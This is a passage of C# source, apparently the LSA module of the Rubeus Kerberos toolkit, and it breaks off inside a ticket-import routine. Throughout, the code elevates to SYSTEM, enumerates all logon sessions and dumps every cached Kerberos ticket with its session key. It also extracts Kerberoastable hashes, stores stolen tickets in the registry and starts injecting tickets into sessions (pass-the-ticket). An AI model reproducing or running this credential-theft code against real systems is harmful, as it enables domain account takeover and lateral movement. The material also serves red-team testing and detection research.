using Asn1;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.AccessControl;
using Microsoft.Win32;
using ConsoleTables;
using System.Security.Principal;
using Rubeus.lib.Interop;


namespace Rubeus
{
    public class LSA
    {
        #region LSA interaction

        public enum TicketDisplayFormat : int
        {
            None = 0,           // if we're just after enumerated tickets
            Triage = 1,         // triage table output
            Klist = 2,          // traditional klist format
            Full = 3            // full ticket data extraction (a la "dump")
        }

        public class SESSION_CRED
        {
            // contains information on a logon session and any associated credentials
            //  used/returned by ExtractTickets

            public LogonSessionData LogonSession;

            public List<KRB_TICKET> Tickets;
        }

        public class KRB_TICKET
        {
            // contains cache info (i.e. KERB_TICKET_CACHE_INFO_EX) and the full .kirbi
            public string ClientName;
            public string ClientRealm;
            public string ServerName;
            public string ServerRealm;
            public DateTime StartTime;
            public DateTime EndTime;
            public DateTime RenewTime;
            public Int32 EncryptionType;
            public Interop.TicketFlags TicketFlags;
            public KRB_CRED KrbCred;
        }

        public static IntPtr LsaRegisterLogonProcessHelper()
        {
            // helper that establishes a connection to the LSA server and verifies that the caller is a logon application
            //  used for Kerberos ticket enumeration for ALL users

            var logonProcessName = "User32LogonProcesss"; // yes I know this is "weird" ;)
            Interop.LSA_STRING_IN LSAString;
            var lsaHandle = IntPtr.Zero;
            UInt64 securityMode = 0;

            LSAString.Length = (ushort)logonProcessName.Length;
            LSAString.MaximumLength = (ushort)(logonProcessName.Length + 1);
            LSAString.Buffer = logonProcessName;

            var ret = Interop.LsaRegisterLogonProcess(LSAString, out lsaHandle, out securityMode);

            return lsaHandle;
        }

        public static IntPtr GetLsaHandle()
        {
            // returns a handle to LSA
            //  uses LsaConnectUntrusted() if not in high integrity
            //  uses LsaRegisterLogonProcessHelper() if in high integrity

            IntPtr lsaHandle;

            if (!Helpers.IsHighIntegrity())
            {
                int retCode = Interop.LsaConnectUntrusted(out lsaHandle);
            }

            else
            {
                lsaHandle = LsaRegisterLogonProcessHelper();

                // if the original call fails then it is likely we don't have SeTcbPrivilege
                // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
                if (lsaHandle == IntPtr.Zero)
                {
                    var currentName = WindowsIdentity.GetCurrent().Name;

                    if (Helpers.IsSystem())
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        lsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        if (!Helpers.GetSystem())
                        {
                            throw new Exception("Could not elevate to system");
                        }
                        // should now have the proper privileges to get a Handle to LSA
                        lsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }

            return lsaHandle;
        }

        public static KRB_CRED ExtractTicket(IntPtr lsaHandle, int authPack, LUID userLogonID, string targetName, UInt32 ticketFlags = 0)
        {
            // extracts an encoded KRB_CRED for a specified userLogonID (LUID) and targetName (SPN)
            // by calling LsaCallAuthenticationPackage() w/ the KerbRetrieveEncodedTicketMessage message type

            var responsePointer = IntPtr.Zero;
            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();
            var returnBufferLength = 0;
            var protocalStatus = 0;
            KRB_CRED ticketKirbi = null;

            // signal that we want encoded .kirbi's returned
            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;

            // the specific logon session ID
            request.LogonId = userLogonID;
            //request.TicketFlags = ticketFlags;
            request.TicketFlags = 0x0;
            // Note: ^ if a ticket has the forwarded flag (instead of initial), hard specifying the ticket
            //      flags here results in no match, and a new (RC4_HMAC?) ticket is requested but not cached
            //      from https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_request :
            //          "If there is no match in the cache, a new ticket with the default flag values will be requested."
            //  Yes, I know this is weird. No, I have no idea why it happens. Specifying 0x0 (the default) will return just the main
            //      (initial) TGT, or a forwarded ticket if that's all that exists (a la the printer bug)
            request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED - return the ticket as a KRB_CRED credential
            request.EncryptionType = 0x0;
            
            // the target ticket name we want the ticket for
            var tName = new Interop.UNICODE_STRING(targetName);
            request.TargetName = tName;

            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
            //      for KerbRetrieveEncodedTicketMessages

            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            var newStructSize = structSize + tName.MaximumLength;
            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            // marshal the struct from a managed object to an unmanaged block of memory.
            Marshal.StructureToPtr(request, unmanagedAddr, false);
            
            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

            // copy unicode chars to the new location
            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

            // update the target name buffer ptr            
            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);

            // actually get the data
            int retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack,
                unmanagedAddr, newStructSize, out responsePointer,
                out returnBufferLength, out protocalStatus);
            
            // TODO: is this needed?
            //if (retCode != 0)
            //{
            //    throw new NtException(retCode);
            //}

            // translate the LSA error (if any) to a Windows error
            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            if ((retCode == 0) && ((uint)winError == 0) &&
                (returnBufferLength != 0))
            {
                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response =
                    (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(
                        (System.IntPtr)responsePointer,
                        typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                var encodedTicketSize = response.Ticket.EncodedTicketSize;

                // extract the ticket, build a KRB_CRED object, and add to the cache
                var encodedTicket = new byte[encodedTicketSize];
                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0,
                    encodedTicketSize);

                ticketKirbi = new KRB_CRED(encodedTicket);
            }
            else
            {
                var errorMessage = new Win32Exception((int)winError).Message;
                Console.WriteLine(
                    "\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}",
                    winError, targetName, errorMessage);
            }

            // clean up
            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            return ticketKirbi;
        }

        public static List<SESSION_CRED> EnumerateTickets(bool extractTicketData = false, LUID targetLuid = new LUID(), string targetService = null, string targetUser = null, string targetServer = null, bool includeComputerAccounts = true, bool silent = false)
        {
            //  Enumerates Kerberos tickets with various targeting options

            //  targetLuid              -   the target logon ID (LUID) to extract tickets for. Requires elevation.
            //  targetService           -   the target service name to extract tickets for (use "krbtgt" for TGTs)
            //  extractTicketData       -   extract full ticket data instead of just metadata information
            //  targetUser              -   the target user name to extract tickets for
            //  targetServer            -   the target full SPN (i.e. cifs/machine.domain.com) to extract tickets for
            //  includeComputerAccounts -   bool to include computer accounts in the output

            //  For elevated enumeration, the code first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper() connect to LSA
            //      then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
            //      and finally uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            //  For elevated enumeration, the code first uses LsaConnectUntrusted() to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
            //      to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //      to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1


            // sanity checks
            if (!Helpers.IsHighIntegrity() && ( ((ulong)targetLuid != 0) || (!String.IsNullOrEmpty(targetUser)) ) )
            {
                Console.WriteLine("[X] You need to be in high integrity for the actions specified.");
                return null;
            }

            if (!silent)
            {
                // silent mode is for "monitor"/"harvest" to prevent this data display each time
                if (!String.IsNullOrEmpty(targetService))
                {
                    Console.WriteLine("[*] Target service  : {0:x}", targetService);
                }
                if (!String.IsNullOrEmpty(targetServer))
                {
                    Console.WriteLine("[*] Target server   : {0:x}", targetServer);
                }
                if (!String.IsNullOrEmpty(targetUser))
                {
                    Console.WriteLine("[*] Target user     : {0:x}", targetUser);
                }
                if (((ulong)targetLuid != 0))
                {
                    Console.WriteLine("[*] Target LUID     : {0:x}", targetLuid);
                }

                Console.WriteLine("[*] Current LUID    : {0}\r\n", Helpers.GetCurrentLUID());
            }

            int retCode;
            int authPack;
            var name = "kerberos";
            var sessionCreds = new List<SESSION_CRED>();

            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            var lsaHandle = GetLsaHandle();

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // STEP 1 - enumerate all current longon session IDs (LUID)
                //          if not elevated, this returns the current user's LUID
                //          if elevated, this returns ALL LUIDs
                foreach (var luid in EnumerateLogonSessions())
                {
                    // if we're targeting a specific LUID, check and skip if needed
                    if (((ulong)targetLuid != 0) && (luid != targetLuid))
                        continue;

                    // STEP 2 - get the actual data for this logon session (username, domain, logon time, etc.)
                    var logonSessionData = new LogonSessionData();
                    try
                    {
                        logonSessionData = GetLogonSessionData(luid);
                    }
                    catch
                    {
                        continue;
                    }

                    // start building the result object we want
                    SESSION_CRED sessionCred = new SESSION_CRED();
                    sessionCred.LogonSession = logonSessionData;
                    sessionCred.Tickets = new List<KRB_TICKET>();
                    
                    // phase 1 of targeting

                    // exclude computer accounts unless instructed otherwise
                    if (!includeComputerAccounts && Regex.IsMatch(logonSessionData.Username, ".*\\$$"))
                        continue;
                    // if we're enumerating tickets/logon sessions for a specific user
                    if (!String.IsNullOrEmpty(targetUser) && !Regex.IsMatch(logonSessionData.Username, Regex.Escape(targetUser), RegexOptions.IgnoreCase))
                        continue;

                    var ticketsPointer = IntPtr.Zero;
                    var returnBufferLength = 0;
                    var protocalStatus = 0;

                    var ticketCacheRequest = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                    var ticketCacheResponse = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                    Interop.KERB_TICKET_CACHE_INFO_EX ticketCacheResult;

                    // input object for querying the ticket cache for a specific logon ID
                    ticketCacheRequest.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
                    if (Helpers.IsHighIntegrity())
                    {
                        ticketCacheRequest.LogonId = logonSessionData.LogonID;
                    }
                    else
                    {
                        // if we're not elevated, we have to have a LUID of 0 here to prevent failure
                        ticketCacheRequest.LogonId = new LUID();
                    }
                    
                    var tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));
                    Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);

                    // STEP 3 - query LSA, specifying we want information for the ticket cache for this particular LUID
                    retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr,
                        Marshal.SizeOf(ticketCacheRequest), out ticketsPointer, out returnBufferLength,
                        out protocalStatus);

                    if (retCode != 0)
                    {
                        throw new NtException(retCode);
                    }

                    if (ticketsPointer != IntPtr.Zero)
                    {
                        // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                        ticketCacheResponse = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(
                            (System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                        var count2 = ticketCacheResponse.CountOfTickets;

                        if (count2 != 0)
                        {
                            bool krbtgtFound = false; // for sessions with multiple TGTs (krbtgt service targets), only include one ticket

                            // get the size of the structures we're iterating over
                            var dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                            for (var j = 0; j < count2; j++)
                            {
                                // iterate through the result structures
                                var currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                // parse the new ptr to the appropriate structure
                                ticketCacheResult = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(
                                    currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                                KRB_TICKET ticket = new KRB_TICKET();
                                ticket.StartTime = DateTime.FromFileTime(ticketCacheResult.StartTime);
                                ticket.EndTime = DateTime.FromFileTime(ticketCacheResult.EndTime);
                                ticket.RenewTime = DateTime.FromFileTime(ticketCacheResult.RenewTime);
                                ticket.TicketFlags = (Interop.TicketFlags)ticketCacheResult.TicketFlags;
                                ticket.EncryptionType = ticketCacheResult.EncryptionType;
                                ticket.ServerName = Marshal.PtrToStringUni(ticketCacheResult.ServerName.Buffer, ticketCacheResult.ServerName.Length / 2);
                                ticket.ServerRealm = Marshal.PtrToStringUni(ticketCacheResult.ServerRealm.Buffer, ticketCacheResult.ServerRealm.Length / 2);
                                ticket.ClientName = Marshal.PtrToStringUni(ticketCacheResult.ClientName.Buffer, ticketCacheResult.ClientName.Length / 2);
                                ticket.ClientRealm = Marshal.PtrToStringUni(ticketCacheResult.ClientRealm.Buffer, ticketCacheResult.ClientRealm.Length / 2);

                                bool includeTicket = true;

                                if ( !String.IsNullOrEmpty(targetService) && !Regex.IsMatch(ticket.ServerName, String.Format(@"^{0}/.*", Regex.Escape(targetService)), RegexOptions.IgnoreCase))
                                {
                                    includeTicket = false;
                                }
                                if (!String.IsNullOrEmpty(targetServer) && !Regex.IsMatch(ticket.ServerName, String.Format(@".*/{0}", Regex.Escape(targetServer)), RegexOptions.IgnoreCase))
                                {
                                    includeTicket = false;
                                }

                                if (Regex.IsMatch(ticket.ServerName, @"^krbtgt/.*", RegexOptions.IgnoreCase))
                                {
                                    if(krbtgtFound)
                                    {
                                        includeTicket = false;
                                    }
                                    else
                                    {
                                        krbtgtFound = true;
                                    }
                                }

                                if (includeTicket)
                                {
                                    if (extractTicketData)
                                    {
                                        // STEP 4 - query LSA again, specifying we want the actual ticket data for this particular ticket (.kirbi/KRB_CRED)
                                        ticket.KrbCred = ExtractTicket(lsaHandle, authPack, ticketCacheRequest.LogonId, ticket.ServerName, ticketCacheResult.TicketFlags);
                                    }
                                    sessionCred.Tickets.Add(ticket);
                                }
                            }
                        }
                    }

                    // cleanup
                    Interop.LsaFreeReturnBuffer(ticketsPointer);
                    Marshal.FreeHGlobal(tQueryPtr);

                    sessionCreds.Add(sessionCred);
                }
                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                return sessionCreds;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
                return null;
            }
        }

        #endregion


        #region Output

        public static void DisplaySessionCreds(List<SESSION_CRED> sessionCreds, TicketDisplayFormat displayFormat, bool showAll = false)
        {
            // displays a given .kirbi (KRB_CRED) object, with display options

            //  sessionCreds            -   list of one or more SESSION_CRED objects
            //  displayFormat           -   the TicketDisplayFormat to display the tickets in ("Triage" table, traditional "Klist", or "Full" for full ticket extraction)
            //  displayTGT              -   shortened display for monitor/harvesting
            //  displayB64ticket        -   display a base64 encoded version of the ticket
            //  extractKerberoastHash   -   extract out the rc4_hmac "kerberoastable" hash, if possible

            // used for table output
            var table = new ConsoleTable("LUID", "UserName", "Service", "EndTime");

            foreach (var sessionCred in sessionCreds)
            {
                // don't display logon sessions with no tickets
                if( (sessionCred.Tickets.Count == 0) && (!showAll))
                {
                    continue;
                }

                if ( (displayFormat == TicketDisplayFormat.Full) || displayFormat == TicketDisplayFormat.Klist)
                {
                    Console.WriteLine("  UserName                 : {0}", sessionCred.LogonSession.Username);
                    Console.WriteLine("  Domain                   : {0}", sessionCred.LogonSession.LogonDomain);
                    Console.WriteLine("  LogonId                  : {0}", sessionCred.LogonSession.LogonID);
                    Console.WriteLine("  UserSID                  : {0}", sessionCred.LogonSession.Sid);
                    Console.WriteLine("  AuthenticationPackage    : {0}", sessionCred.LogonSession.AuthenticationPackage);
                    Console.WriteLine("  LogonType                : {0}", sessionCred.LogonSession.LogonType);
                    Console.WriteLine("  LogonTime                : {0}", sessionCred.LogonSession.LogonTime);
                    Console.WriteLine("  LogonServer              : {0}", sessionCred.LogonSession.LogonServer);
                    Console.WriteLine("  LogonServerDNSDomain     : {0}", sessionCred.LogonSession.DnsDomainName);
                    Console.WriteLine("  UserPrincipalName        : {0}\r\n", sessionCred.LogonSession.Upn);
                }

                for(int j = 0; j < sessionCred.Tickets.Count; j++)
                {
                    var ticket = sessionCred.Tickets[j];

                    if (displayFormat == TicketDisplayFormat.Triage)
                    {
                        table.AddRow(sessionCred.LogonSession.LogonID.ToString(), String.Format("{0} @ {1}", ticket.ClientName, ticket.ClientRealm), ticket.ServerName, ticket.EndTime.ToString());
                    }
                    else if (displayFormat == TicketDisplayFormat.Klist)
                    {
                        Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", j, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);
                        Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", ticket.StartTime, ticket.EndTime, ticket.RenewTime);
                        Console.WriteLine("      Server Name       : {0} @ {1}", ticket.ServerName, ticket.ServerRealm);
                        Console.WriteLine("      Client Name       : {0} @ {1}", ticket.ClientName, ticket.ClientRealm);
                        Console.WriteLine("      Flags             : {0} ({1:x})\r\n", ticket.TicketFlags, (UInt32)ticket.TicketFlags);
                    }
                    else if (displayFormat == TicketDisplayFormat.Full)
                    {
                        if (ticket.KrbCred != null)
                        {
                            DisplayTicket(ticket.KrbCred, 4, false, true, false);
                        }
                    }
                }
            }

            if (displayFormat == TicketDisplayFormat.Triage)
            {
                // write out the table
                table.Write();
            }
        }

        public static void DisplayTicket(KRB_CRED cred, int indentLevel = 2, bool displayTGT = false, bool displayB64ticket = false, bool extractKerberoastHash = false, bool nowrap = false)
        {
            // displays a given .kirbi (KRB_CRED) object, with display options

            //  cred                    -   the KRB_CRED object to display
            //  indentLevel             -   level of indent, default of 2
            //  displayTGT              -   shortened display for monitor/harvesting
            //  displayB64ticket        -   display a base64 encoded version of the ticket
            //  extractKerberoastHash   -   extract out the rc4_hmac "kerberoastable" hash, if possible
            //  nowrap                  -   don't wrap base64 ticket output

            var userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            var domainName = cred.enc_part.ticket_info[0].prealm;
            var sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
            var srealm = cred.enc_part.ticket_info[0].srealm;
            var keyType = String.Format("{0}", (Interop.KERB_ETYPE)cred.enc_part.ticket_info[0].key.keytype);
            var b64Key = Convert.ToBase64String(cred.enc_part.ticket_info[0].key.keyvalue);
            var startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
            var endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
            var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
            var flags = cred.enc_part.ticket_info[0].flags;
            var base64ticket = Convert.ToBase64String(cred.Encode().Encode());
            string indent = new string(' ', indentLevel);

            if (displayTGT)
            {
                // abbreviated display used for monitor/etc.
                Console.WriteLine("{0}User                  :  {1}@{2}", indent, userName, domainName);
                Console.WriteLine("{0}StartTime             :  {1}", indent, startTime);
                Console.WriteLine("{0}EndTime               :  {1}", indent, endTime);
                Console.WriteLine("{0}RenewTill             :  {1}", indent, renewTill);
                Console.WriteLine("{0}Flags                 :  {1}", indent, flags);
                Console.WriteLine("{0}Base64EncodedTicket   :\r\n", indent);

                if (Rubeus.Program.wrapTickets)
                {
                    foreach (var line in Helpers.Split(base64ticket, 100))
                    {
                        Console.WriteLine("{0}  {1}", indent, line);
                    }
                }
                else
                {
                    Console.WriteLine("{0}  {1}", indent, base64ticket);
                }
            }
            else
            {
                // full display with session key
                Console.WriteLine("\r\n{0}ServiceName           :  {1}", indent, sname);
                Console.WriteLine("{0}ServiceRealm          :  {1}", indent, srealm);
                Console.WriteLine("{0}UserName              :  {1}", indent, userName);
                Console.WriteLine("{0}UserRealm             :  {1}", indent, domainName);
                Console.WriteLine("{0}StartTime             :  {1}", indent, startTime);
                Console.WriteLine("{0}EndTime               :  {1}", indent, endTime);
                Console.WriteLine("{0}RenewTill             :  {1}", indent, renewTill);
                Console.WriteLine("{0}Flags                 :  {1}", indent, flags);
                Console.WriteLine("{0}KeyType               :  {1}", indent, keyType);
                Console.WriteLine("{0}Base64(key)           :  {1}", indent, b64Key);

                if (displayB64ticket)
                {
                    // if we're displaying the base64 encoding of the ticket
                    Console.WriteLine("{0}Base64EncodedTicket   :\r\n", indent);
                    if (Rubeus.Program.wrapTickets)
                    {
                        foreach (var line in Helpers.Split(base64ticket, 100))
                        {
                            Console.WriteLine("{0}  {1}", indent, line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("{0}  {1}", indent, base64ticket);
                    }
                }

                else if (extractKerberoastHash)
                {
                    // if this isn't a TGT, try to display a Kerberoastable hash
                    if (!keyType.Equals("rc4_hmac"))
                    {
                        // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
                        //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
                        Console.WriteLine("\r\n[!] Service ticket uses encryption key type '{0}', unable to extract hash and salt.", keyType);
                    }
                    else
                    {
                        Roast.DisplayTGShash(cred);
                    }
                }
            }

            Console.WriteLine();
        }

        public static void SaveTicketsToRegistry(List<KRB_CRED> creds, string baseRegistryKey)
        {
            // saves an array of .kirbis to the registry

            string user = null;
            RegistryKey basePath = null;
            if (Helpers.IsSystem())
            {
                user = "NT AUTHORITY\\SYSTEM";
            }
            else
            {
                user = Environment.UserDomainName + "\\" + Environment.UserName;
            };

            try
            {
                // first,make sure the appropriate ACLs are set
                Registry.LocalMachine.CreateSubKey(baseRegistryKey);
                basePath = Registry.LocalMachine.OpenSubKey(baseRegistryKey, RegistryKeyPermissionCheck.ReadWriteSubTree);
                var rs = basePath.GetAccessControl();
                var rar = new RegistryAccessRule(
                    user,
                    RegistryRights.FullControl,
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                    PropagationFlags.None,
                    AccessControlType.Allow);
                rs.AddAccessRule(rar);
                basePath.SetAccessControl(rs);
            }
            catch
            {
                Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", baseRegistryKey);
                basePath = null;
            }
            if (basePath != null)
            {
                foreach (var cred in creds)
                {
                    var userName = cred.enc_part.ticket_info[0].pname.name_string[0];
                    var domainName = cred.enc_part.ticket_info[0].prealm;
                    var startTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].starttime);
                    var endTime = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].endtime);
                    var renewTill = TimeZone.CurrentTimeZone.ToLocalTime(cred.enc_part.ticket_info[0].renew_till);
                    var flags = cred.enc_part.ticket_info[0].flags;
                    var base64TGT = Convert.ToBase64String(cred.Encode().Encode());

                    var userData = basePath.CreateSubKey(userName + "@" + domainName);

                    // Create the keys underneath this
                    userData.SetValue("Username", domainName + "\\" + userName);
                    userData.SetValue("StartTime", startTime);
                    userData.SetValue("EndTime", endTime);
                    userData.SetValue("RenewTill", renewTill);
                    userData.SetValue("Flags", flags);
                    userData.SetValue("Base64EncodedTicket", base64TGT);
                }
                Console.WriteLine("\r\n[*] Wrote {0} tickets to HKLM:\\{1}.", creds.Count, baseRegistryKey);
            }
        }

        #endregion


        #region LogonSessions

        public static List<LUID> EnumerateLogonSessions()
        {
            // returns a List of LUIDs representing current logon sessions
            var luids = new List<LUID>();

            if (!Helpers.IsHighIntegrity())
            {
                luids.Add(Helpers.GetCurrentLUID());
            }

            else
            {
                var ret = Interop.LsaEnumerateLogonSessions(out var count, out var luidPtr);

                if (ret != 0)
                {
                    throw new Win32Exception(ret);
                }

                for (ulong i = 0; i < count; i++)
                {
                    var luid = (LUID)Marshal.PtrToStructure(luidPtr, typeof(LUID));
                    luids.Add(luid);
                    luidPtr = (IntPtr)(luidPtr.ToInt64() + Marshal.SizeOf(typeof(LUID)));
                }
                Interop.LsaFreeReturnBuffer(luidPtr);
            }

            return luids;
        }

        public class LogonSessionData
        {
            public LUID LogonID;
            public string Username;
            public string LogonDomain;
            public string AuthenticationPackage;
            public Interop.LogonType LogonType;
            public int Session;
            public SecurityIdentifier Sid;
            public DateTime LogonTime;
            public string LogonServer;
            public string DnsDomainName;
            public string Upn;
        }

        public static LogonSessionData GetLogonSessionData(LUID luid)
        {
            // gets additional logon session information for a given LUID

            var luidPtr = IntPtr.Zero;
            var sessionDataPtr = IntPtr.Zero;

            try
            {
                luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
                Marshal.StructureToPtr(luid, luidPtr, false);

                var ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
                if (ret != 0)
                {
                    throw new Win32Exception((int)ret);
                }

                var unsafeData =
                    (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionDataPtr,
                        typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                return new LogonSessionData()
                {
                    AuthenticationPackage = Marshal.PtrToStringUni(unsafeData.AuthenticationPackage.Buffer, unsafeData.AuthenticationPackage.Length / 2),
                    DnsDomainName = Marshal.PtrToStringUni(unsafeData.DnsDomainName.Buffer, unsafeData.DnsDomainName.Length / 2),
                    LogonDomain = Marshal.PtrToStringUni(unsafeData.LoginDomain.Buffer, unsafeData.LoginDomain.Length / 2),
                    LogonID = unsafeData.LoginID,
                    LogonTime = DateTime.FromFileTime((long)unsafeData.LoginTime),
                    //LogonTime = systime.AddTicks((long)unsafeData.LoginTime),
                    LogonServer = Marshal.PtrToStringUni(unsafeData.LogonServer.Buffer, unsafeData.LogonServer.Length / 2),
                    LogonType = (Interop.LogonType)unsafeData.LogonType,
                    Sid = (unsafeData.PSiD == IntPtr.Zero ? null : new SecurityIdentifier(unsafeData.PSiD)),
                    Upn = Marshal.PtrToStringUni(unsafeData.Upn.Buffer, unsafeData.Upn.Length / 2),
                    Session = (int)unsafeData.Session,
                    Username = Marshal.PtrToStringUni(unsafeData.Username.Buffer, unsafeData.Username.Length / 2),
                };
            }
            finally
            {
                if (sessionDataPtr != IntPtr.Zero)
                    Interop.LsaFreeReturnBuffer(sessionDataPtr);

                if (luidPtr != IntPtr.Zero)
                    Marshal.FreeHGlobal(luidPtr);
            }
        }

        #endregion


        #region Import and Export

        public static void ImportTicket(byte[] ticket, LUID targetLuid)
        {
            // uses LsaCallAuthenticationPackage() with a message type of KERB_SUBMIT_TKT_REQUEST to submit a ticket
            //  for the current (or specified) logon session

            // straight from Vincent LE TOUX' work
            //  https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2925-L2971

            var LsaHandle = IntPtr.Zero;
            int AuthenticationPackage;
            int ntstatus, ProtocalStatus;

            if ((ulong)targetLuid != 0)
            {
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to a different logon session");
                    return;
                }
                else
                {
                    if (Helpers.IsSystem())
                    {
                        // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                        LsaHandle = LsaRegisterLogonProcessHelper();
                    }
                    else
                    {
                        // elevated but not system, so gotta GetSystem() first
                        Helpers.GetSystem();
                        // should now have the proper privileges to get a Handle to LSA
                        LsaHandle = LsaRegisterLogonProcessHelper();
                        // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                        Interop.RevertToSelf();
                    }
                }
            }
            else
            {
                // otherwise use the unprivileged connection with LsaConnectUntrusted
                ntstatus = Interop.LsaConnectUntrusted(out LsaHandle);
            }

            var inputBuffer = IntPtr.Zero;
            IntPtr ProtocolReturnBuffer;
            int ReturnBufferLength;
            try
            {
                Interop.LSA_STRING_IN LSAString;
                var Name = "kerberos";
                LSAString.Length = (ushort)Name.Length;
                LSAString.MaximumLength = (ushort)(Name.Length + 1);
                LSAString.Buffer = Name;
                ntstatus = Interop.LsaLookupAuthenticationPackage(LsaHandle, ref LSAString, out AuthenticationPackage);
                if (ntstatus != 0)
                {
                    var winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
                    var errorMessage = new Win32Exception((int)winError).Message;
                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                    return;
                }
                var request = new Interop.KERB_SUBMIT_TKT_REQUEST();
                request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbSubmitTicketMessage;
                request.KerbCredSize = ticket.Length;
